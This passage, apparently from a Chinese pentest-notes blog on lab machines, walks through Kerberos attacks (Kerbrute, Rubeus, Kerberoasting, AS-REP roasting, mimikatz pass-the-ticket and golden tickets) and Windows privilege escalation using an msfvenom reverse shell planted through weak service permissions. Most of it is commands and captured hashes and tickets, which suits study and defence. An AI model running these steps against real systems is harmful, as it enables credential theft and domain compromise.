Kerberos**\n\n- 使用 Kerbrute 和 Rubeus 等工具进行初始枚举\n- kerberoasting\n- 使用 Rubeus 和 Impacket 进行 AS-REP 烘焙\n- 金/银票攻击\n- 传票\n- 使用 mimikatz 的万能钥匙攻击\n\n## #1 介绍\n\n#### 什么是 Kerberos？- \n\nKerberos 是 Microsoft Windows 域的默认身份验证服务。通过使用第三方票据授权以及更强的加密，它旨在比 NTLM 更“安全”。尽管 NTLM 有更多的攻击向量可供选择，但 Kerberos 仍然有一些潜在的漏洞，就像我们可以利用的 NTLM 一样。\n\n\n\n#### 常用术语 - \n\n- **Ticket Granting Ticket 票据授予票据 (TGT)** - 票据授予票据是一种身份验证票据，用于从 TGS 向域中的特定资源请求服务票据。\n- **Key Distribution Center 密钥分发中心 (KDC)** - 密钥分发中心是一种用于发布 TGT 和服务票据的服务，包括身份验证服务和票据授予服务。\n- **Authentication Service 身份验证服务** **(AS)** - 身份验证服务发出 TGT 以供域中的 TGS 使用， 以请求访问其他机器和服务票据。\n- **Ticket Granting Service 票据授予服务 (TGS)** - 票据授予服务获取 TGT 并将票据返回到域上的机器。\n- **Service Principal Name 服务主体名称 (SPN)** - 服务主体名称是提供给服务实例的标识符，用于将服务实例与域服务帐户相关联。Windows 要求服务具有域服务帐户，这就是服务需要 SPN 集的原因。\n- **KDC Long Term Secret Key KDC 长期密钥 (KDC LT Key)** - KDC 密钥基于 KRBTGT 服务帐户。它用于加密 TGT 和签署 PAC。\n- **Client Long Term Secret Key 客户端长期密钥（客户端 LT 密钥）** - 客户端密钥基于计算机或服务帐户。它用于检查加密的时间戳并加密会话密钥。\n- **Service Long Term Secret Key 服务端长期密钥 (Service LT Key)** - 服务密钥基于服务帐户。它用于加密服务票据的服务部分并签署 PAC。\n- **Session Key 会话密钥**- 在发布 TGT 时由 KDC 发布。用户在请求服务票据时将向 KDC 提供会话密钥以及 TGT。\n- **Privilege Attribute Certificate 特权属性证书 (PAC)** - PAC 保存用户的所有相关信息，它与 TGT 一起发送到 KDC，由目标 LT 密钥和 KDC LT 密钥签名，以验证用户。\n\n\n\n#### 详细的带预认证的 AS-REQ - \n\n当用户从 KDC 请求 TGT 时，Kerberos 身份验证中的 AS-REQ 步骤开始。为了验证用户并为用户创建 TGT，KDC 必须遵循这些确切的步骤。第一步是用户加密时间戳 NT 哈希并将其发送到 AS。KDC 尝试使用来自用户的 NT 散列来解密时间戳，如果成功，KDC 将为用户发布 TGT 以及会话密钥。\n\n\n\n#### 票据授予票据内容 -\n\n为了了解服务票证是如何创建和验证的，我们需要从票证的来源开始；TGT 由用户提供给 KDC，作为回报，KDC 验证 TGT 并返回服务票证。\n\n<img src=\"https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/11/0e6df39b088b69673b03bf3ba4606e9d.png\" alt=\"image-20220531094650428\" style=\"zoom: 25%;\" />\n\n\n\n#### 服务单内容 - \n\n要了解 Kerberos 身份验证的工作原理，您首先需要了解这些票证包含什么以及如何验证它们。服务票据包含两部分：服务提供部分和用户提供部分。我会把它分解成每个部分包含的内容。\n\n- 服务部分：用户详细信息、会话密钥、使用服务帐户 NTLM 哈希加密票证。\n- 用户部分：有效性时间戳、会话密钥、使用 TGT 会话密钥加密。\n\n<img src=\"https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/11/2102ff15e7476be481beb1a7e029d389.png\" alt=\"image-20220531094824478\" style=\"zoom:25%;\" />\n\n\n\n#### Kerberos 身份验证概述 -\n\n<img src=\"https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/11/ec06eb18c6e11e863afe6c47c937e3a9.png\" alt=\"image-20220531094906872\" style=\"zoom: 50%;\" />\n\nAS-REQ - 1.) 客户端请求身份验证票证或票证授予票证 (TGT)。\n\nAS-REP - 2.) 密钥分发中心验证客户端并发回加密的 TGT。\n\nTGS-REQ - 3.) 客户端将加密的 TGT 与客户端想要访问的服务的服务主体名称 (SPN) 一起发送到票证授予服务器 (TGS)。\n\nTGS-REP - 4.) 密钥分发中心 (KDC) 验证用户的 TGT 以及用户有权访问服务，然后向客户端发送服务的有效会话密钥。\n\nAP-REQ - 5.) 客户端请求服务并发送有效会话密钥以证明用户具有访问权限。\n\nAP-REP - 6.) 服务授予访问权限\n\n\n\n#### 攻击权限要求 -\n\n- Kerbrute 枚举 - 无需域访问 \n- 传递票证 - 以用户身份访问所需的域\n- Kerberoasting - 以任何需要的用户身份访问\n- AS-REP Roasting - 以任何需要的用户身份访问\n- Golden Ticket - 需要完整的域妥协（域管理员） \n- Silver Ticket - 需要服务哈希 \n- 万能钥匙 - 需要完整的域妥协（域管理员）\n\n\n\n## #2 Kerbrute 枚举\n\nkerbrute : https://github.com/ropnop/kerbrute/releases\n\nuser.txt : https://raw.githubusercontent.com/Cryilllic/Active-Directory-Wordlists/master/User.txt\n\n```\n./kerbrute_linux_amd64 userenum -d CONTROLLER.local --dc 10.10.124.146 User.txt\n```\n\n![image-20220531110137790](https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/11/3445635a22c41b4ebad87ad745bfa01e.png)\n\n\n\n\n\n## #3 用 Rubeus 获取票据 & 破解票据\n\n####  Rubeus 获取票据\n\n```bash\nRubeus.exe harvest /interval:30    # 每30秒收获一次TGT\n\nCONTROLLER-1 C:\\Users\\Administrator\\Downloads>Rubeus.exe harvest /interval:30\n                                                                                                                                                                       \n  (_____ \\      | |                                                                                                 \n  |  __  /| | | |  _ \\| ___ | | | |/___)                                                                           \n  |_|   |_|____/|____/|_____)____/(___/                                                                                                                                               \n\n[*] Action: TGT Harvesting (with auto-renewal) \n[*] Monitoring every 30 seconds for new TGTs\n[*] Displaying the working TGT cache every 30 seconds\n\n\n[*] Refreshing TGT ticket cache (5/30/2022 7:57:25 PM)\n\n  User                  :  CONTROLLER-1$@CONTROLLER.LOCAL \n  StartTime             :  5/30/2022 6:26:57 PM\n  EndTime               :  5/31/2022 4:26:57 AM\n  RenewTill             :  6/6/2022 6:26:57 PM\n  Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable\n  Base64EncodedTicket   :\n\n    doIFhDCCBYCgAwIBBaEDAgEWooIEeDCCBHRhggRwMIIEbKADAgEFoRIbEENPTlRST0xMRVIuTE9DQUyiJTAjoAMCAQKhHDAaGwZr\n    cmJ0Z3QbEENPTlRST0xMRVIuTE9DQUyjggQoMIIEJKADAgESoQMCAQKiggQWBIIEEiufD0DYuMmQCg/dSQ7ShTy7kGSlSnmPmtzR\n    ......\n    MCmgAwIBEqEiBCAzaBGdXMlb9yAiEvd5TDxkuK8shpBpRrS93/diGlyMuKESGxBDT05UUk9MTEVSLkxPQ0FMohowGKADAgEBoREw\n    DxsNQ09OVFJPTExFUi0xJKMHAwUAQOEAAKURGA8yMDIyMDUzMTAxMjY1N1qmERgPMjAyMjA1MzExMTI2NTdapxEYDzIwMjIwNjA3\n    MDEyNjU3WqgSGxBDT05UUk9MTEVSLkxPQ0FMqSUwI6ADAgECoRwwGhsGa3JidGd0GxBDT05UUk9MTEVSLkxPQ0FM\n\n  User                  :  CONTROLLER-1$@CONTROLLER.LOCAL\n  StartTime             :  5/30/2022 6:26:57 PM\n  EndTime               :  5/31/2022 4:26:57 AM\n  RenewTill             :  6/6/2022 6:26:57 PM\n  Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable\n  Base64EncodedTicket   :\n\n    doIFhDCCBYCgAwIBBaEDAgEWooIEeDCCBHRhggRwMIIEbKADAgEFoRIbEENPTlRST0xMRVIuTE9DQUyiJTAjoAMCAQKhHDAaGwZr\n    cmJ0Z3QbEENPTlRST0xMRVIuTE9DQUyjggQoMIIEJKADAgESoQMCAQKiggQWBIIEEpl0EQ1mPJUIoWWPlW9vQCv5BjpYk/UdQ16F\n    ......\n    DxsNQ09OVFJPTExFUi0xJKMHAwUAYKEAAKURGA8yMDIyMDUzMTAxMjY1N1qmERgPMjAyMjA1MzExMTI2NTdapxEYDzIwMjIwNjA3\n    MDEyNjU3WqgSGxBDT05UUk9MTEVSLkxPQ0FMqSUwI6ADAgECoRwwGhsGa3JidGd0GxBDT05UUk9MTEVSLkxPQ0FM\n\n  User                  :  Administrator@CONTROLLER.LOCAL\n  StartTime             :  5/30/2022 7:47:33 PM\n  EndTime               :  5/31/2022 5:47:33 AM\n  RenewTill             :  6/6/2022 7:47:33 PM\n  Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable\n  Base64EncodedTicket   :\n\n    doIFjDCCBYigAwIBBaEDAgEWooIEgDCCBHxhggR4MIIEdKADAgEFoRIbEENPTlRST0xMRVIuTE9DQUyiJTAjoAMCAQKhHDAaGwZr\n    cmJ0Z3QbEENPTlRST0xMRVIuTE9DQUyjggQwMIIELKADAgESoQMCAQKiggQeBIIEGskQlYMSWETwhc7mgPsK7FDZYoVI8F4VS/pl\n\t......\n    oAMCAQGhETAPGw1BZG1pbmlzdHJhdG9yowcDBQBA4QAApREYDzIwMjIwNTMxMDI0NzMzWqYRGA8yMDIyMDUzMTEyNDczM1qnERgP\n    MjAyMjA2MDcwMjQ3MzNaqBIbEENPTlRST0xMRVIuTE9DQUypJTAjoAMCAQKhHDAaGwZrcmJ0Z3QbEENPTlRST0xMRVIuTE9DQUw=\n\n```\n\n\n\n#### 使用 Rubeus 进行暴力破解/密码喷洒 -\n\n在使用 Rubeus 进行密码喷洒之前，您需要将域控制器域名添加到 windows 主机文件中。您可以使用 echo 命令将 IP 和域名添加到机器中的 hosts 文件中： \n\n```bash\necho 10.10.124.146 CONTROLLER.local >> C:\\Windows\\System32\\drivers\\etc\\hosts\n\nRubeus.exe brute /password:Password1 /noticket  # 这将采用给定的密码并将其喷洒给所有找到的用户，然后为该用户提供 .kirbi TGT\n```\n\n```cmd\ncontroller\\administrator@CONTROLLER-1 C:\\Users\\Administrator\\Downloads>echo 10.10.124.146 CONTROLLER.local >> C:\\Windows\\System32\\drivers\\etc\\hosts\ncontroller\\administrator@CONTROLLER-1 C:\\Users\\Administrator\\Downloads>Rubeus.exe brute /password:Password1 /noticket\n   ______        _  (_____ \\      | |\n   _____) )_   _| |__  _____ _   _  ___  |  __  /| | | |  _ \\| ___ | | | |/___)\n  | |  \\ \\| |_| | |_) ) ____| |_| |___ |  |_|   |_|____/|____/|_____)____/(___/\n  v1.5.0\n[-] Blocked/Disabled user => Guest\n[-] Blocked/Disabled user => krbtgt[+] STUPENDOUS => Machine1:Password1\n[*] base64(Machine1.kirbi):\n      doIFWjCCBVagAwIBBaEDAgEWooIEUzCCBE9hggRLMIIER6ADAgEFoRIbEENPTlRST0xMRVIuTE9DQUyi     \n      ......\n      GA8yMDIyMDUzMTAzMjMzNlqmERgPMjAyMjA1MzExMzIzMzZapxEYDzIwMjIwNjA3MDMyMzM2WqgSGxBD\n      T05UUk9MTEVSLkxPQ0FMqSUwI6ADAgECoRwwGhsGa3JidGd0GxBDT05UUk9MTEVSLmxvY2Fs\n\n\n\n[+] Done\n```\n\n\n\n\n\n## #4 用Rubeus 和 Impacket 进行 Kerberoasting\n\n#### Rubeus\n\n```\ncontroller\\administrator@CONTROLLER-1 C:\\Users\\Administrator\\Downloads>Rubeus.exe kerberoast\n\n   ______        _\n  (_____ \\      | |\n   _____) )_   _| |__  _____ _   _  ___\n  |  __  /| | | |  _ \\| ___ | | | |/___)\n  | |  \\ \\| |_| | |_) ) ____| |_| |___ |\n  |_|   |_|____/|____/|_____)____/(___/\n\n  v1.5.0\n\n\n[*] Action: Kerberoasting\n\n[*] NOTICE: AES hashes will be returned for AES-enabled accounts. \n[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts. \n\n[*] Searching the current domain for Kerberoastable users \n\n[*] Total kerberoastable users : 2\n\n\n[*] SamAccountName         : SQLService\n[*] DistinguishedName      : CN=SQLService,CN=Users,DC=CONTROLLER,DC=local \n[*] ServicePrincipalName   : CONTROLLER-1/SQLService.CONTROLLER.local:30111\n[*] PwdLastSet             : 5/25/2020 10:28:26 PM\n[*] Supported ETypes       : RC4_HMAC_DEFAULT\n[*] Hash                   : n\n\n\n[*] SamAccountName         : HTTPService\n[*] DistinguishedName      : CN=HTTPService,CN=Users,DC=CONTROLLER,DC=local\n[*] ServicePrincipalName   : CONTROLLER-1/HTTPService.CONTROLLER.local:30222\n[*] PwdLastSet             : 5/25/2020 10:39:17 PM\n[*] Supported ETypes       : RC4_HMAC_DEFAULT\n[*] Hash                   : $krb5tgs$23$*HTTPService$CONTROLLER.local$CONTROLLER-1/HTTPService.CONTROLLER.lo\n                             cal:30222*$8567C8880014354D68ACF7B9C004873B$F1EAC83F611ED876A7DB3B727430122DDC92\n                             B82C4EEA0F199640460E8B00F8E1E8115DF7F0911295008FF0E1C53C72AD1FA9E27EA71622D6D19B\n\t\t\t\t\t\t   ......\n                             00097158E360177967C7E017FFF668FD344B2F42E4D7B8BD5E190F688CA83F5AFA8E29F47B5ED488\n                             9A3995140D3FEAC5ABD25C244ABE894E3D3386AE84435FACDB8C15FC56C3\n```\n\n\n\n#### Impacket\n\n```bash\n┌──(root㉿kali)-[~/thm/dc]\n└─# impacket-GetUserSPNs controller.local/Machine1:Password1 -dc-ip 10.10.79.10 -request                   \nImpacket v0.9.24 - Copyright 2021 SecureAuth Corporation\n\nServicePrincipalName                             Name         MemberOf                                                         PasswordLastSet             LastLogon                   Delegation \n-----------------------------------------------  -----------  ---------------------------------------------------------------  --------------------------  --------------------------  ----------\nCONTROLLER-1/SQLService.CONTROLLER.local:30111   SQLService   CN=Group Policy Creator Owners,OU=Groups,DC=CONTROLLER,DC=local  2020-05-26 06:28:26.922527  2020-05-26 06:46:42.467441             \nCONTROLLER-1/HTTPService.CONTROLLER.local:30222  HTTPService                                                                   2020-05-26 06:39:17.578393  2020-05-26 06:40:14.671872             \n\n\n\n$krb5tgs$23$*SQLService$CONTROLLER.LOCAL$controller.local/SQLService*$284b86804969fcad912913c995a87122$9f23877d25bc8cddabd687c3aa89d878bb926db8b684ff937a4fa1a25c94989a0a1e039b8a21b29b88759ef09f43fd0edd4e2cdf688019f080945bba722138b......\nd40cb5c2c9267594874f7e393763e81141370fd422624b340070cfe7e5f20bd6a9b5be125b7550055241219e6daa7fc504fa1c\n$krb5tgs$23$*HTTPService$CONTROLLER.LOCAL$controller.local/HTTPService*$3760a3668088f7092337c2e826c43790$75fe3fb9176fcbf3c62a8ae0630b628a7fb6b954e4dc87770128407ca83125f1836abde59017299e01ae3471c80358a5facb984ffc606f06c147202283ea30fa1f04442d9755934a87d428c760f9a3a0f228536454e9ba8f090e3107365d225603bd71b5c2f5d78efe29d5a0fe89d79bd1992b7ad6898e7a......\n19b97dde84b97a95a79460bd7c41ec97791759524c91d47df3ab4350d06582a0160d9730d8bd84785eab1f51c8bff55430435548\n\n```\n\n\n\n#### 破解hash\n\n```\nhashcat -m 13100 kerberoas_hash2 /usr/share/wordlists/rockyou.txt \n```\n\n\n\n#### 服务帐户可以做什么？\n\n破解服务帐户密码后，根据服务帐户是否为域管理员，有多种方法可以窃取数据或收集战利品。如果服务帐户是域管理员，您拥有类似于金/银票的控制权，并且现在可以收集战利品，例如转储 NTDS.dit。如果服务帐户不是域管理员，您可以使用它来登录其他系统并进行旋转或升级，或者您可以使用破解的密码来攻击其他服务和域管理员帐户；许多公司可能会为其服务或域管理员用户重复使用相同或相似的密码。\n\n\n\n## #5 用Rubeus进行AS-REP Roasting \n\n#### Rubeus\n\n`Rubeus.exe asreproast` - 这将运行 AS-REP Roasting 命令寻找易受攻击的用户，然后转储发现的易受攻击的用户哈希。\n\n```\nRubeus.exe asreproast\ncontroller\\administrator@CONTROLLER-1 C:\\Users\\Administrator\\Downloads>Rubeus.exe asreproast\n\n   ______        _\n  (_____ \\      | |\n   _____) )_   _| |__  _____ _   _  ___\n  |  __  /| | | |  _ \\| ___ | | | |/___)\n  | |  \\ \\| |_| | |_) ) ____| |_| |___ |\n  |_|   |_|____/|____/|_____)____/(___/\n\n  v1.5.0\n\n\n[*] Action: AS-REP roasting\n\n[*] Target Domain          : CONTROLLER.local\n\n[*] Searching path 'LDAP://CONTROLLER-1.CONTROLLER.local/DC=CONTROLLER,DC=local' for AS-REP roastable users\n[*] SamAccountName         : Admin2\n[*] DistinguishedName      : CN=Admin-2,CN=Users,DC=CONTROLLER,DC=local\n[*] Using domain controller: CONTROLLER-1.CONTROLLER.local (fe80::1017:ba9c:ee45:508d%5)\n[*] Building AS-REQ (w/o preauth) for: 'CONTROLLER.local\\Admin2'\n[+] AS-REQ w/o preauth successful!\n[*] AS-REP hash:\n\n      $krb5asrep$Admin2@CONTROLLER.local:06CDBC190707473F71CDF6CECAE5F20B$0AD65C0ACC46\n      ED5215457CF68B1BB3FA8F6322E750A61AFB1977D1C1AB50138FA51B9907E1FB47B32241D636A8C8\n      EEF5564ED8A0F1756582CAD702F5DD776317BC1B99814AA31C9527A8AB15D47FAB6DF19F5428382A\n      A70B036C1B54BF482BB317AFD03F26C73F7214FFC3F5398250C7F928A391FCBF3EB445A4BD34409D\n      CE1241BF34BE9EC3787815978E6A52A6FBAA92061FB90434D5F6F40F75649C7F5457A48BBF146C74\n      EF2CFDC4540BD3A313BDE30E2030D10A0CE707304461C80CBEEB4EE8B7FF4B3869E1ECBEEB4B84C3\n      93A7683056C1D880E5882B2AB56E784C97F620F0B9870105398CF8824BF25E8CC4ED5EB282D9\n\n[*] SamAccountName         : User3\n[*] DistinguishedName      : CN=User-3,CN=Users,DC=CONTROLLER,DC=local\n[*] Using domain controller: CONTROLLER-1.CONTROLLER.local (fe80::1017:ba9c:ee45:508d%5)\n[*] Building AS-REQ (w/o preauth) for: 'CONTROLLER.local\\User3'\n[+] AS-REQ w/o preauth successful!\n[*] AS-REP hash:\n\n      $krb5asrep$User3@CONTROLLER.local:A2342209F120FA68D66E88C3FA1DC661$8225304A422C8\n      7024ACC1EBC674E2CA5A29F4DC512CD4824466F337CB9190098A881785B20C3249F2FFA45A3900E6\n      87150A8186E9403271237B19F240A191AA176B6C832DAFC2FC04E3FA5BFCAEB44E6F850DA5FC3889\n      6C7419101D679C382A6DE6054701BDC05AB48CE179D787D62AC23A5B13C59C897B5FF0EDC588FA67\n      2044ABB10A91F1D537AE4D492D906FC26E9C91D4E07FE9209BB798D4B1A119611D187EFA7F4B3C51\n      BBD9EADEE8125DD703CDFB2B2BC6B9AA6F0626F2F6112A556244F8363F1ECAD69F92A464E4EAFD75\n      48AFC9EC0F1D42331F93F4AB3FD60F4592B2AEAD5B647F3D66CCD5EF44A18A26EA72C95F6C3\n```\n\n\n\n#### impacket-GetNPUsers\n\n1. 先用kerbrute枚举用户名。\n2. 再用impacket-GetNPUsers对已存在用户进行AS-REP Roasting \n\n```bash\n┌──(root㉿kali)-[~/thm/dc]\n└─# ./kerbrute_linux_amd64 userenum -d controller.local --dc 10.10.79.10 User.txt\n\n    __             __               __     \n   / /_____  _____/ /_  _______  __/ /____ \n  / //_/ _ \\/ ___/ __ \\/ ___/ / / / __/ _ \\\n / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/\n/_/|_|\\___/_/  /_.___/_/   \\__,_/\\__/\\___/                                        \n\nVersion: v1.0.3 (9dad6e1) - 05/31/22 - Ronnie Flathers @ropnop\n\n2022/05/31 14:42:12 >  Using KDC(s):\n2022/05/31 14:42:12 >  \t10.10.79.10:88\n\n2022/05/31 14:42:12 >  [+] VALID USERNAME:\t admin1@controller.local\n2022/05/31 14:42:12 >  [+] VALID USERNAME:\t administrator@controller.local\n2022/05/31 14:42:12 >  [+] VALID USERNAME:\t admin2@controller.local\n2022/05/31 14:42:14 >  [+] VALID USERNAME:\t httpservice@controller.local\n2022/05/31 14:42:14 >  [+] VALID USERNAME:\t user1@controller.local\n2022/05/31 14:42:14 >  [+] VALID USERNAME:\t sqlservice@controller.local\n2022/05/31 14:42:14 >  [+] VALID USERNAME:\t machine1@controller.local\n2022/05/31 14:42:14 >  [+] VALID USERNAME:\t machine2@controller.local\n2022/05/31 14:42:14 >  [+] VALID USERNAME:\t user3@controller.local\n2022/05/31 14:42:14 >  [+] VALID USERNAME:\t user2@controller.local\n2022/05/31 14:42:14 >  Done! Tested 100 usernames (10 valid) in 2.335 seconds\n                                                                                                                   \n┌──(root㉿kali)-[~/thm/dc]\n└─# impacket-GetNPUsers controller.local/ -dc-ip 10.10.79.10 -usersfile users.txt\nImpacket v0.9.24 - Copyright 2021 SecureAuth Corporation\n\n[-] User admin1 doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] User administrator doesn't have UF_DONT_REQUIRE_PREAUTH set\n$krb5asrep$23$admin2@CONTROLLER.LOCAL:07a875b10ff834c5a2aea53d367d88e0$d867b1bb964665668d8405a90ccf69099c615ffd2611be6c53ffde1fa918b55a5bd4f8078d20124cc2b88e14939e76f7cb20f36e1dc26282b03b5455ba979ca8b5a8680b585bee525a28746ef61bf096706addfdd47fcbd434d55581a2492522cd6884b48e6c1342abd67a62f0f1d8121ba9a559a4827550603699a7d408e2ff74521208f153bbd77b80d54dd71909e650f6898180f38eac5ed0013bd1c86baa70c5acb0567873d10a7270cb03b65c4fb03f12dddf76e3db5f1cc330d126017725b9571c02e87c1b30b6457ab390d47e73ed1838ec0a34345de43fd9a604f0d4cf2930b50d2717cbd54d13040c6e35c6828190d8\n[-] User httpservice doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] User user1 doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] User sqlservice doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] User machine1 doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] User machine2 doesn't have UF_DONT_REQUIRE_PREAUTH set\n$krb5asrep$23$user3@CONTROLLER.LOCAL:e6bed73be459842186ce695e7080075b$0d9f7c02066d7255f0ffae252d29b4738af12e3f914559fc67e3b4b6fa52afdc5904c5b769c58afed62caa2e714b64748194a50e6b38ae47f2d3f03faf6bd50570d0d382885cc59a98fd4b3844fb557b37c98855e7b3d0423faa4683341bc06eba64f0e5df2fc2b506987225b885ccf06ca94801273b355f1af2c001b151f73a2d8eae8470d7699d20c12b8f7e9b0410de278189f3bfb905a3626c3be77f803f69e5885f7e91a0564f4f5c7a15789bb32b7aec1df7705ba84cf4066df79d007be9c91da6b0fc001553a68b0f2f4a7f01e22211ea171ee80a44469f661fdda4422e6fe99b6a72316395c874c316b1c731c05f6c63\n[-] User user2 doesn't have UF_DONT_REQUIRE_PREAUTH set\n\n```\n\n#### Hashcat 破解hash\n\n```\nhashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt \n```\n\n\n\n## #6使用 mimikatz 传递票据\n\n\n\n```\nC:\\Users\\Administrator\\Downloads>mimikatz.exe\n\nmimikatz # privilege::debug \nPrivilege '20' OK \n\nmimikatz # sekurlsa::tickets /export \n\n\n```\n\n导出kirbi文件在mimikatz同级目录下\n\n![image-20220531163144243](https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/11/3154a0edb7581424e8ab64130f8c288b.png)\n\n导入票据\n\n```\nkerberos::ptt <ticket>\nkerberos::ptt [0;48506]-2-0-40e10000-Administrator@krbtgt-CONTROLLER.LOCAL.kirbi\n```\n\n![image-20220531164744121](https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/11/779d67e721c744fb9731b6a5ef0e188c.png)\n\n\n\n## #7 mimikatz 金/银票攻击\n\n\n\n```\nmimikatz.exe\nprivilege::debug\nKerberos::golden /user:Administrator /domain:controller.local /sid:S-1-5-21-432953485-3795405108-1502158860 /krbtgt:72cd714611b64cd4d5550cd2759db3f6 /id:502\n```\n\n","tags":["Kerberos"]},{"title":"Windows privesc","url":"/2022/11/07/Windows-privesc/","content":"\n### #0 信息收集\n\n```bash\n# 用户信息收集\n当前用户的权限：whoami /priv\n列出用户：net users\n列出用户的详细信息：net user username（e.g. net user Administrator）\n其他用户同时登录：qwinsta（与query session命令相同）\n系统上定义的用户组：net localgroup\n列出特定组的成员：net localgroup groupname（e.g. net localgroup Administrators）\n\n# 系统信息收集\nsysteminfo\nsysteminfo | findstr /B /C:\"OS Name\" /C:\"OS Version\"\nhostname\n\n# 补丁详细情况\nwmic qfe get Caption,Description,HotFixID,InstalledOn\n\n# 搜索文件\nfindstr /si password *.txt\n命令分解：\nfindstr：搜索文件中的文本模式。\n/si：搜索当前目录和所有子目录（s），忽略大写/小写差异（i）\npassword：该命令将在文件中搜索字符串“密码”\n*.txt：搜索将涵盖具有 .txt 扩展名的文件\n可以根据您的需要和目标环境更改字符串和文件扩展名，但“.txt”、“.xml”、“.ini”、“*.config”和“.xls”通常是一个好地方开始。\n\n# 网络连接\nnetstat -ano\n\n# 计划任务\nschtasks：该命令可用于查询计划任务。\nschtasks /query /fo LIST /v\n\n# 驱动程序\ndriverquery\n\n# 查看杀毒软件状态\nsc query windefend\n```\n\n\n\n### #1 Tools\n\nWinPEAS：https://github.com/carlospolop/PEASS-ng\n\nPowerUp：https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc\n\n```bash\n# 反向shell\nmsfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=53 -f exe -o reverse.exe\n```\n\n\n\n### #2 服务漏洞\n\n) 1 - 不安全的服务权限\n\naccesschk.exe：https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk\n\n```cmd\naccesschk.exe -uwcqv \"Users\" *\t#跟下面命令相同\nC:\\PrivEsc\\accesschk.exe /accepteula -uwcqv user *  #daclsvc服务user用户拥有更改服务配置权限(SERVICE_CHANGE_CONFIG)\nsc qc daclsvc\t#查询服务并注意它以 SYSTEM 权限 (SERVICE_START_NAME) 运行\nsc config daclsvc binpath= \"\\\"C:\\PrivEsc\\reverse.exe\\\"\"\t#修改服务配置并将 BINARY_PATH_NAME (binpath) 设置为反向shell\nnet start daclsvc\t#在 Kali 上启动一个侦听器，然后启动该服务以生成一个以 SYSTEM 权限运行的反向 shell\n```\n\n![image-20220525152423849](https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/11/18e6999b565eedec7fb1a6b2f5d4cac5.png)\n\n![image-20220525142216546](https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/11/9ec64c21e9788fd47b791f7090696368.png)\n\n\n\n) 2 - 未引用的服务路径\n\n```cmd\nC:\\Program Files\\Unquoted Path Service>sc qc unquotedsvc\t\t#查询“ unquotedsvc” 服务，注意它以 SYSTEM 权限 (SERVICE_START_NAME) 运行，并且 BINARY_PATH_NAME 未引用并包含空格\n[SC] QueryServiceConfig SUCCESS\n\nSERVICE_NAME: unquotedsvc\n        TYPE               : 10  WIN32_OWN_PROCESS\n        START_TYPE         : 3   DEMAND_START\n        ERROR_CONTROL      : 1   NORMAL\n        BINARY_PATH_NAME   : C:\\Program Files\\Unquoted Path Service\\Common Files\\unquotedpathservice.exe\n        LOAD_ORDER_GROUP   :\n        TAG                : 0\n        DISPLAY_NAME       : Unquoted Path Service\n        DEPENDENCIES       :\n        SERVICE_START_NAME : LocalSystem\n\nC:\\Program Files\\Unquoted Path Service>C:\\PrivEsc\\accesschk.exe /accepteula -uwdq \"C:\\Program Files\\Unquoted Path Service\\\"\t\t#使用 accesschk.exe，注意 BUILTIN\\Users 组允许写入 C:\\Program Files\\Unquoted Path Service\\ 目录\nC:\\Program Files\\Unquoted Path Service\n  Medium Mandatory Level (Default) [No-Write-Up]\n  RW BUILTIN\\Users\n  RW NT SERVICE\\TrustedInstaller\n  RW NT AUTHORITY\\SYSTEM\n  RW BUILTIN\\Administrators\n\nC:\\Program Files\\Unquoted Path Service>copy C:\\PrivEsc\\reverse.exe \"C:\\Program Files\\Unquoted Path Service\\Common.exe\"\t\t#您创建的 reverse.exe 可执行文件复制到此目录并将其重命名为 Common.exe\n        1 file(s) copied.\n\nC:\\Program Files\\Unquoted Path Service>net start unquotedsvc\t\t#在 Kali 上启动一个侦听器，然后启动该服务以生成一个以 SYSTEM 权限运行的反向 shell\n```\n\n![image-20220525152457510](https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/11/3fa41de4e02b651ab6472babe9289531.png)\n\n![image-20220525154120916](https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/11/38dee7976244eabac32b962460dd7433.png)\n\n\n\n) 3 - 不安全的注册表服务\n\n```cmd\nc:\\PrivEsc>sc qc regsvc\t\t# 查询“ regsvc” 服务\n[SC] QueryServiceConfig SUCCESS\n\nSERVICE_NAME: regsvc\n        TYPE               : 10  WIN32_OWN_PROCESS\n        START_TYPE         : 3   DEMAND_START\n        ERROR_CONTROL      : 1   NORMAL\n        BINARY_PATH_NAME   : \"C:\\Program Files\\Insecure Registry Service\\insecureregistryservice.exe\"\n        LOAD_ORDER_GROUP   :\n        TAG                : 0\n        DISPLAY_NAME       : Insecure Registry Service\n        DEPENDENCIES       :\n        SERVICE_START_NAME : LocalSystem\t\t\t# 注意它以 SYSTEM 权限 (SERVICE_START_NAME) 运行\n\nc:\\PrivEsc>C:\\PrivEsc\\accesschk.exe /accepteula -uvwqk HKLM\\System\\CurrentControlSet\\Services\\regsvc\nHKLM\\System\\CurrentControlSet\\Services\\regsvc\t# 使用 accesschk.exe(注意修改对应服务名称)\n  Medium Mandatory Level (Default) [No-Write-Up]\n  RW NT AUTHORITY\\SYSTEM\n        KEY_ALL_ACCESS\n  RW BUILTIN\\Administrators\n        KEY_ALL_ACCESS\n  RW NT AUTHORITY\\INTERACTIVE\t#请注意 regsvc 服务的注册表项可由“NT  AUTHORITY\\INTERACTIVE”组（基本上所有登录用户）写入\n        KEY_ALL_ACCESS\n\nc:\\PrivEsc>reg add HKLM\\SYSTEM\\CurrentControlSet\\services\\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\\PrivEsc\\reverse.exe /f\nThe operation completed 